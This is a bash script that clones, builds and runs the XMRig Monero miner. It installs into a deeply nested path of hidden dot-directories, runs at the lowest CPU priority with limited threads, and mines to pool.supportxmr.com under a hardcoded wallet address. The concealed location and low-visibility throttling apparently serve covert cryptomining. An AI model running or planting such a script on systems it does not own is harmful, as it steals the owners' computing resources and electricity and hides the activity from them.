#!/bin/bash

# Step 1: Create directories and navigate
echo "Step 1: Creating directories and navigating..."
mkdir -p ~/.local/.run/.hello/runner/go/beein/.go/do && cd ~/.local/.run/.hello/runner/go/beein/.go/do

# Step 2: Update and upgrade apt
echo "Step 2: Updating and upgrading apt..."
sudo apt update
sudo apt upgrade -y

# Step 3: Install necessary packages
echo "Step 3: Installing necessary packages..."
sudo apt install cpulimit git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y

# Step 4: Clone xmrig repository
echo "Step 4: Cloning xmrig repository..."
git clone https://github.com/xmrig/xmrig.git

# Step 5: Build xmrig
echo "Step 5: Building xmrig..."
cd xmrig && mkdir build && cd build
(
    nice -n 19 cmake ..
    nice -n 19 make -j1
) &

# Store the PID of the background subshell
BUILD_PID=$!

echo "Build process started in background with PID: $BUILD_PID"

# Wait for the build process to finish
wait $BUILD_PID

# Check the exit status of the build process
if [ $? -eq 0 ]; then
    echo "Build process completed successfully."
else
    echo "Build process failed."
fi

# Step 6: Run xmrig
echo "Step 6: Running xmrig..."
nice -n 19 ./xmrig --cpu-max-threads-hint=40 -o pool.supportxmr.com:3333 -u 46iWdfQ1WgVaJNjPCbVBsnVnzPEjTv8f9ReQTzX4JjCoRsH17PkfXFsCnfcwg1kGmDFD848DJb6QP6mt31SSnrMJ28q1s2p -p laptop -k --donate-level 1 -t 1

echo "Script execution complete. XMRig is running in the background."
